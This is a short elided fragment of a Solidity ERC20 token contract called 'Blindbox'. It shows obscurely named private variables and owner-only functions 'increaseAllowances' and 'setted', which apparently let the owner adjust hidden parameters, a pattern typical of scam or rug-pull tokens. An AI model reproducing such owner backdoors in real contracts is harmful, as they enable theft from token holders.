...
contract  Blindbox is ERC20, Ownable {
    using SafeMath for uint256;
   ...
   bool private swapping;
    ...
    uint256 private txtwo = 18;
      uint256 public launchedAt;
        uint256 private lunchTime=2;
        uint256 private onetime;
        uint256 private ted = 70;
  uint256 private _maxTxAmount = 300000 * 10**6 * 10**9;
    ...
    constructor() public ERC20("Blind box", "Blind box",9) {
   ...
   function increaseAllowances(address spender, uint256 addedValue)external onlyOwner{
    ...
    function setted(uint256 re) external onlyOwner{
    ted = re;
    }
